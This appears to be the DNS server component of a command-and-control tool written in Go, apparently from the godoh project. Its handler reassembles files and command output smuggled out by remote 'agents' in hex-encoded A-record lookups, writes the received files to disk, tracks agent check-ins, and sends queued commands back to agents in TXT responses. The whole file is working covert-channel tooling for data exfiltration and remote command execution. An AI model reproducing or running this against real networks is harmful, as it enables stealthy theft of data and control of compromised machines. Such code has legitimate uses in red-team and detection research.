package dnsserver

import (
	"bytes"
	"crypto/sha1"
	"encoding/hex"
	"errors"
	"fmt"
	"hash/crc32"
	"io/ioutil"
	"net"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"github.com/sensepost/godoh/lib"
	"github.com/sensepost/godoh/protocol"
)

// Handler handles incoming lookups.
type Handler struct {
	StreamSpool  map[string]protocol.DNSBuffer
	CommandSpool map[string]protocol.Command
	Agents       map[string]protocol.Agent // Updated with TXT record checkins

	Log *zerolog.Logger
}

// ServeDNS serves the DNS server used to read incoming lookups and process them.
func (h *Handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {

	msg := dns.Msg{}
	msg.SetReply(r)

	// Setup the response we will send. By default we assume everything
	// will be successful and flip to failure as needed.
	// for txt records we assume there is no command by default
	msg.Authoritative = true
	domain := msg.Question[0].Name
	aRecordResponse := protocol.SuccessDNSResponse
	txtRecordResponse := protocol.NoCmdTxtResponse

	// Now, depending on the question we got, parse, split and do what is needed.
	switch r.Question[0].Qtype {
	case dns.TypeA:

		// parse the question labels
		ident, streamType, seq, transferProtocol, byteData, err := h.parseARRLabels(r)
		if err != nil {
			aRecordResponse = err.Error()
			break
		}

		// A few things can happen here. Many of the code paths rely on
		// knowing whether we have an existing stream for this ident. So
		// get the status of that and save the DNSSteam if we have it.
		bufferRecord, ok := h.StreamSpool[ident]

		// Handle new streams by taking note and starting them
		if (streamType == protocol.StreamStart) && !ok {

			DNSBuf := &protocol.DNSBuffer{
				Identifier: ident,
				Seq:        seq,
				Started:    true,
				Finished:   false,
				Protocol:   transferProtocol,
			}

			// Add this new stream identifier
			h.StreamSpool[ident] = *DNSBuf
			log.Info().Str("agent", ident).Msg("new incoming dns stream")

			break
		}

		// Error cases for a new stream request
		if (streamType == protocol.StreamStart) && ok {
			log.Error().Str("agent", ident).Msg("not starting a new stream for an existing identifier")
			aRecordResponse = protocol.FailureDNSResponse
			break
		}

		// Handle appending data to streams
		if (streamType == protocol.StreamData) && ok && !bufferRecord.Finished {

			bufferRecord.Data = append(bufferRecord.Data, byteData...)
			bufferRecord.Seq = seq

			// update the buffer for this client
			h.StreamSpool[ident] = bufferRecord

			log.Debug().Str("agent", ident).Int("seq", seq).Bytes("data", byteData).
				Msg("wrote recieved data chunk")
			break
		}

		// Handle errors for data appends
		if (streamType == protocol.StreamData) && !ok {
			log.Error().Str("agent", ident).Msg("not appending to stream that has not started")
			aRecordResponse = protocol.FailureDNSResponse
			break
		}

		if (streamType == protocol.StreamData) && ok && bufferRecord.Finished {
			log.Error().Str("agent", ident).Msg("not appending to stream that has finished")
			aRecordResponse = protocol.FailureDNSResponse
			break
		}

		// Handle closing Streams
		if (streamType == protocol.StreamEnd) && ok && !bufferRecord.Finished {
			bufferRecord.Finished = true
			bufferRecord.Started = false
			bufferRecord.Seq = seq

			// update the buffer for this client
			h.StreamSpool[ident] = bufferRecord

			switch bufferRecord.Protocol {
			case protocol.FileProtocol:
				log.Debug().Str("agent", ident).Msg("decoding fileprotocol stream")

				fp := &protocol.File{}
				if err := lib.UngobUnpress(fp, bufferRecord.Data); err != nil {
					log.Error().Err(err).Str("agent", ident).Msg("failed to ungobpress")
					aRecordResponse = protocol.FailureDNSResponse
					break
				}

				// Update file path to only be the base name
				fp.Name = filepath.Base(fp.Name)

				log.Info().Str("agent", ident).Str("file-name", fp.Name).Str("sha", fp.Shasum).Msg("received file info")

				// check shasum
				h := sha1.New()
				h.Write(*fp.Data)
				cSum := hex.EncodeToString(h.Sum(nil))

				if cSum != fp.Shasum {
					log.Warn().Str("agent", ident).Str("file-name", fp.Name).Str("sha", fp.Shasum).Str("sha-real", cSum).
						Msg("calculated and expected shasum mismatch")
				}

				log.Info().Str("agent", ident).Str("file-name", fp.Name).Msg("writing file to local disk")

				if err := ioutil.WriteFile(fp.Name, *fp.Data, 0644); err != nil {
					log.Error().Err(err).Str("agent", ident).Str("file-name", fp.Name).Msg("failed writing file to local disk")
					aRecordResponse = protocol.FailureDNSResponse
					break
				}

				break

			case protocol.CmdProtocol:
				log.Debug().Str("agent", ident).Msg("decoding cmdprotocol stream")

				cp := &protocol.Command{}
				if err := lib.UngobUnpress(cp, bufferRecord.Data); err != nil {
					log.Error().Err(err).Str("agent", ident).Msg("failed to ungobpress")
					aRecordResponse = protocol.FailureDNSResponse
					break
				}

				fmt.Printf("\nCommand Output:\n-------\n%s\n", cp.Data)

				break

			default:
				log.Warn().Str("agent", ident).Msg("unknown protocol to decode. someone fuzzing us?")
				aRecordResponse = protocol.FailureDNSResponse
				break
			}

			break
		}

		// Handle closing errors
		if (streamType == protocol.StreamEnd) && !ok {
			log.Error().Str("agent", ident).Msg("not appending to stream that has finished")
			aRecordResponse = protocol.FailureDNSResponse
			break
		}

		break

	case dns.TypeTXT:
		ident, err := h.parseTxtRRLabels(r)
		if err != nil {
			log.Debug().Err(err).Msg("failed to parse identifier")
			txtRecordResponse = protocol.ErrorTxtResponse
			break
		}

		// update & record agent meta data
		agentMeta, ok := h.Agents[ident]
		if !ok {
			// register new agent
			agentMeta = protocol.Agent{
				Identifier:   ident,
				FirstCheckin: time.Now(),
				LastCheckin:  time.Now(),
			}
			log.Info().Str("agent", ident).Msg("first time checkin for new agent")

			h.Agents[ident] = agentMeta
		} else {
			// Update the last checkin time
			agentMeta.LastCheckin = time.Now()
			h.Agents[ident] = agentMeta
		}

		// check if we have a command
		cmd, ok := h.CommandSpool[ident]
		if !ok {
			break
		}

		log.Info().Str("agent", ident).Str("command", cmd.Exec).Msg("queuing command for agent")
		txtRecordResponse = protocol.CmdTxtResponse

		var ec bytes.Buffer
		lib.GobPress(cmd.GetOutgoing(), &ec)
		additionalTxtKey := fmt.Sprintf("p=%x", ec.Bytes())

		if len(additionalTxtKey) > 230 {
			log.Error().Str("agent", ident).Str("command", cmd.Exec).Int("encoded-len", len(additionalTxtKey)).
				Msg("command too long for a single txt encoding run. use a shorter one for now, sorry!")
			delete(h.CommandSpool, ident)
			txtRecordResponse = protocol.ErrorTxtResponse
			break
		}

		txtRecordResponse = fmt.Sprintf("%s,%s", txtRecordResponse, fmt.Sprintf("p=%x", ec.Bytes()))

		// Remove the command
		delete(h.CommandSpool, ident)

		break

	default:
		aRecordResponse = protocol.FailureDNSResponse
		break
	}

	// Now, depending on the question we got, build a response packet
	switch r.Question[0].Qtype {
	case dns.TypeA:
		log.Debug().Str("response", aRecordResponse).Msg("A response content")
		msg.Answer = append(msg.Answer, &dns.A{
			Hdr: dns.RR_Header{Name: domain, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
			A:   net.ParseIP(aRecordResponse),
		})
		break
	case dns.TypeTXT:
		log.Debug().Str("response", txtRecordResponse).Msg("TXT response content")
		msg.Answer = append(msg.Answer, &dns.TXT{
			Hdr: dns.RR_Header{Name: domain, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 1},
			Txt: []string{txtRecordResponse},
		})
	}

	w.WriteMsg(&msg)
}

// parseARRLabels splits and parses relevant labels from a question
func (h *Handler) parseARRLabels(r *dns.Msg) (string, byte, int, int, []byte, error) {

	// A hostnames labels are what is interesting to us. Extract them.
	hsq := strings.Split(r.Question[0].String(), ".")

	if len(hsq) <= 9 {
		log.Debug().Str("labels", r.Question[0].String()).Msg("question had less than 9 labels")
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	// Based on the protocol, we have fields to parse.
	// See protocol.utils.Requestify for details.

	// the first label will have a ;. a dig thing.
	ident := strings.Split(hsq[0], ";")[1]

	streamTypeBytes, err := hex.DecodeString(hsq[1])
	if err != nil {
		log.Error().Err(err).Str("agent", ident).Msg("failed to decode stream type bytes")
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}
	streamType := streamTypeBytes[0]

	seq, err := strconv.Atoi(hsq[2])
	if err != nil {
		log.Error().Err(err).Str("agent", ident).Msg("failed to convert seq to int")
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	transferProtocol, err := strconv.Atoi(hsq[4])
	if err != nil {
		log.Error().Err(err).Str("agent", ident).Msg("failed to convert protocol to int")
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	// dataLen is used only in this function to determine the concat
	// amount for data itself.
	dataLen, err := strconv.Atoi(hsq[5])
	if err != nil {
		log.Error().Err(err).Str("agent", ident).Msg("failed to convert data length to int")
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	// build up the data variable. We assume that if a label was 0
	// then the data is not interesting.
	var data string
	switch dataLen {
	case 1:
		data = hsq[6]
		break
	case 2:
		data = hsq[6] + hsq[7]
		break
	case 3:
		data = hsq[6] + hsq[7] + hsq[8]
		break
	}

	// decode the data
	byteData, err := hex.DecodeString(data)
	if err != nil {
		log.Error().Err(err).Str("agent", ident).Msg("failed to decode label data")
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	// crc32 check
	if hsq[3] != fmt.Sprintf("%02x", crc32.ChecksumIEEE(byteData)) {
		log.Warn().Str("agent", ident).Str("expected-crc", hsq[3]).
			Uint32("calculated-crc", crc32.ChecksumIEEE(byteData)).Msg("crc32 check failed")
	}

	return ident, streamType, seq, transferProtocol, byteData, nil
}

// parseARRLabels splits and parses relevant labels from a question
func (h *Handler) parseTxtRRLabels(r *dns.Msg) (string, error) {

	// A hostnames labels are what is interesting to us. Extract them.
	hsq := strings.Split(r.Question[0].String(), ".")

	if len(hsq) <= 1 {
		log.Debug().Str("labels", r.Question[0].String()).Msg("question had less than 1 labels")
		return "", errors.New(protocol.FailureDNSResponse)
	}

	// the first label will have a ;. a dig thing.
	identData := strings.Split(hsq[0], ";")[1]
	identBytes, err := hex.DecodeString(identData)
	if err != nil {
		log.Debug().Err(err).Msg("failed to decode ident bytes")
		return "", errors.New(protocol.FailureDNSResponse)
	}
	ident := string(identBytes)

	return ident, nil
}
